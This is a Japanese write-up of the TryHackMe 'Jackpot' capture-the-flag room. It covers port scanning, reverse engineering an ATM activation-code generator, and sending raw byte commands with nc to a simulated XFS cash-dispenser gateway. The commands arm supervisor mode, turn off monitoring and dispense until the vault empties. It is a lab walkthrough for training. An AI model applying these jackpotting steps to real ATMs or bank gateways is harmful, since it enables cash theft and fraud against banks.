# Jackpot CTF

https://tryhackme.com/room/jackpot

## Enumeration

```shell
TARGET=10.146.185.100
sudo bash -c "echo $TARGET   jackpot.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
9100/tcp open  jetdirect  syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,8080,9100 $TARGET

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```sh
root@ip-10-146-112-124:~# nikto -p 8080 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.185.100
+ Target Hostname:    jackpot.thm
+ Target Port:        8080
+ Start Time:         2026-10-09 23:56:58 (GMT0)
---------------------------------------------------------------------------
+ Server: BaseHTTP/0.6 Python/3.12.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'access-control-allow-origin' found, with contents: *
+ OSVDB-3092: /status/: This might be interesting...
+ OSVDB-3093: /status.php3: This might be interesting... has been seen in web logs from an unknown scanner.
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-10-09 23:57:07 (GMT0) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### tool

8080ポートのリンクからツールをダウンロード。

```sh
$ file ./jackpot                
./jackpot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e9a37729a5046405945de339a6e01a3004b2fb3, for GNU/Linux 3.2.0, stripped
```

リバース。画面に表示されているナンスからアクティベーションコードを計算するコード。

```c
undefined8 FUN_001010a0(int param_1,undefined8 *param_2)
{
  byte bVar1;
  size_t sVar2;
  ulong uVar3;
  byte *pbVar4;
  char *pcVar5;
  ulong uVar6;
  
  if (param_1 == 2) {
    pcVar5 = (char *)param_2[1];
    sVar2 = strlen(pcVar5);
    if (sVar2 == 6) {
      __printf_chk(2,"[*] session nonce : %s\n",pcVar5);
      pbVar4 = (byte *)param_2[1];
      uVar3 = 0xcbf29ce484222325;
      bVar1 = *pbVar4;
      while (bVar1 != 0) {
        pbVar4 = pbVar4 + 1;
        uVar3 = (uVar3 ^ bVar1) * 0x100000001b3;
        bVar1 = *pbVar4;
      }
      pcVar5 = "ENBANK";
      uVar6 = 0x45;
      do {
        pcVar5 = pcVar5 + 1;
        uVar3 = (uVar6 ^ uVar3) * 0x100000001b3;
        uVar3 = uVar3 >> 0x1d ^ uVar3;
        uVar6 = (ulong)(byte)*pcVar5;
      } while (*pcVar5 != 0);
      __printf_chk(2,"[*] activation code: %08u\n",uVar3 % 100000000);
      return 0;
    }
  }
  __fprintf_chk(stderr,2,
                "Earth\'s National Bank - Terminal Engineering Tool\nusage: %s <6-digit session code  from ATM screen>\n"
                ,*param_2);
  return 1;
}
```

実行例

```sh
$ ./jackpot 625071         
[*] session nonce : 625071
[*] activation code: 45882047

$ ./jackpot 625072
[*] session nonce : 625072
[*] activation code: 07205369
```

## 9100 ポート

接続したら、プロトコル仕様が表示された。

```sh
$ nc $TARGET 9100           
�{"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}
```

request format

```
1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data
```

reply format

```
2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)
```

message type

```json
{"GETINFO": "0x01", "EXECUTE": "0x02"}
```

hint に従って、GETINFO WFS_INF_CDM_CAPABILITIES  でコマンド一覧取得。

```sh
$ { python2 -c 'print "\x01\x00\x00\x03\x04\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "interface": "Branch Engineering Gateway (XFS bridge)", "device_class": "CDM", "commands": {"WFS_INF_CDM_STATUS": "0x301", "WFS_INF_CDM_CASH_UNIT_INFO": "0x303", "WFS_INF_CDM_CAPABILITIES": "0x304", "WFS_CMD_CDM_DISPENSE": "0x401", "WFS_CMD_CDM_ARM": "0x4f0", "WFS_CMD_CDM_SET_MONITOR": "0x4f1", "WFS_CMD_CDM_GET_FLAG": "0x4ff"}, "max_dispense": 40}
```

WFS_CMD_CDM_GET_FLAG。当然、フラグはまだ表示されない。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xff\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_CASHUNITERROR", "detail": "no proof of cashout on record"}
```

WFS_INF_CDM_STATUS。画面に表示されているのと同じ情報。

```sh
$ { python2 -c 'print "\x01\x00\x00\x03\x01\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "status": {"nonce": "625071", "armed": false, "monitor_on": true, "locked": false, "lock_remaining": 0, "screen": "INSERT CARD", "dispensed_total": 0, "remaining_notes": 280, "vault_total_notes": 280, "cassettes": [{"id": "CST1", "denom": 10, "count": 100}, {"id": "CST2", "denom": 20, "count": 80}, {"id": "CST3", "denom": 50, "count": 60}, {"id": "CST4", "denom": 100, "count": 40}], "flag_released": false}}
```

WFS_CMD_CDM_DISPENSE。引き出しには管理モードにする必要がある。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\x01\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_NOTARMED", "detail": "DISPENSE denied - not in supervisor mode"}
```

WFS_CMD_CDM_SET_MONITOR。ARMされていないというエラー。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xf1\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_NOTARMED"}
```

WFS_CMD_CDM_ARM。アクティベーションコードが必要。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xf0\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
```

アクティベーションコード：45882047 -> 0x2BC1ABF が不正というエラー。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xf0\x00\x04\x02\xbc\x1a\xbf"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
```

文字列として渡したら成功した。

```sh
$ { printf '\x02\x00\x00\x04\xf0\x00\x08'; printf '45882047'; cat; } \
  | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
```

WFS_CMD_CDM_SET_MONITOR 再チャレンジ。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xf1\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "monitor_on": true}
```

WFS_CMD_CDM_DISPENSE 再チャレンジ。notesが40個減った。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\x01\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "notes": 40, "value": 4000, "remaining_notes": 240}
```

notesを減らすため再度実行したらロックエラーになった。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\x01\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_ERR_CDM_LOCKED", "detail": "anomalous dispense with null transaction id -> machine locked", "lock_seconds": 45}
```

まず、モニターをOFF状態にする必要があると思われる。

モニターOFFにするため試行錯誤。

```sh
$ { python2 -c 'print "\x02\x00\x00\x04\xf1\x00\x00"'; cat; } | nc $TARGET 9100
{"rc": "WFS_SUCCESS", "monitor_on": true}

$ { python2 -c 'print "\x02\x00\x00\x04\xf1\x00\x01\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "monitor_on": true}

$ { printf '\x02\x00\x00\x04\xf1\x00\x05'; printf 'false'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "monitor_on": true}
```

文字列で0を送ったらOFFにすることに成功した。

```sh
 { printf '\x02\x00\x00\x04\xf1\x00\x01'; printf '0'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "monitor_on": false}
```

モニターOFFの状態でDispenseを繰り返したら、残りnotesが0になりフラグを取得できた。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\x01\x00\x00"'; cat; } | nc $TARGET 9100
...
{"rc": "WFS_SUCCESS", "notes": 40, "value": 400, "remaining_notes": 0, "detail": "vault empty - cashout proven; GET_FLAG now available"}
```

フラグ取得成功。

```sh
$ { python2 -c 'print "\x01\x00\x00\x04\xff\x00\x00"'; cat; } | nc $TARGET 9100
{"rc": "WFS_SUCCESS", "flag": "THM{[REDACTED]}"}
```

## 振り返り

- パラメータを文字列で渡せばよいことを発見するのが難しかった。

## Tags

#tags:ATM #tags:独自プロトコル
